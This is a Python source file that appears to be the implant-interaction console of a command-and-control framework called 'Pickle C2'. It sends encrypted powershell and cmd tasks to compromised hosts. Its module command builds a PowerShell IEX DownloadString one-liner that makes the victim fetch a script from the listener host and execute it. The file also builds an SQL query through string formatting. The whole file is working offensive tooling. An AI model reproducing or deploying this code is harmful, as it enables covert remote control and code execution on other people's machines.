from tabulate import tabulate
from time import sleep
import sqlite3
import os

from Core import encryption, color, database, helper




def interact(conn,command):

	name = command.split()[1]
	key = database.return_key(conn,name)[0][0]

	while True:

		interact_command = input("[%s%s%s]%s[%s%s%s]%s " % (color.red("Pickle"),color.yellow("@"),color.cyan("C2"),color.yellow("-->"),color.red("Implant"),color.yellow(":"),color.cyan(name),color.yellow("::>"))).strip()

		if interact_command[:10] == "powershell" or interact_command[:3] == "cmd":

			print ("[%s] Executing a %s command" % (color.cyan("*"),interact_command.split()[0]))

			enc_command = encryption.EncryptString(interact_command,key)

			save_command = open("data/implant/%s/tasks.enc" % name,"w")
			save_command.write(enc_command)
			save_command.close()




		elif interact_command[:4] == "exit":


			ask = input("[%s] Are you sure?? Do you want to end the Implant? (Y,N): " % color.cyan("*"))

			if ask =="y":

				print ("[%s] Exit the Implant" % color.green("+"))


				enc_command = encryption.EncryptString("exit",key)

				save_command = open("data/implant/%s/tasks.enc" % name,"w")
				save_command.write(enc_command)
				save_command.close()


				return True


		elif interact_command[:4] == "help":


			print ("\n%s\n" % helper.help_interact2())


		elif interact_command == "back":

			return True

		elif interact_command[:5] == "sleep":

			print ("[%s] Changing the sleep time" % color.green("+"))

			enc_command = encryption.EncryptString(interact_command,key)

			save_command = open("data/implant/%s/tasks.enc" % name,"w")
			save_command.write(enc_command)
			save_command.close()

		elif interact_command[:11] == "list module":

			results = database.list_module(conn)

			data = []

			for i in range(0,len(results)):

				data.append([results[i][0],results[i][1]])

			print("\n",tabulate(data, headers=["Module","Description"]),"\n")


		elif interact_command[:6] == "module":
			Invoke_command = input("[%s] Enter the command::> " % color.cyan("*")).strip()

			try:
				module_name = interact_command.split()[1]
				results = database.list_module(conn)
				results = results[0][2]

				file = open(results,"r").read()
				edit = open("data/implant/%s/host.ps1" % name,"w")
				edit.write(file)
				edit.close()



				conn = sqlite3.connect("database.db")
				conn.cursor()
				results = conn.execute("SELECT Listener_IP,Listener_Port FROM Implant_Info WHERE Implant_Name='%s'" % name)
				results = results.fetchall()

				command ="powershell IEX(New-Object Net.Webclient).DownloadString('http://%s:%s/down/%s/host.ps1');%s" % (results[0][0],results[0][1],name,Invoke_command)

				enc_command = encryption.EncryptString(command,key)
				save_command = open("data/implant/%s/tasks.enc" % name,"w")
				save_command.write(enc_command)
				save_command.close()

			except:

				print ("[%s] Wrong Action!!" % color.red("-"))
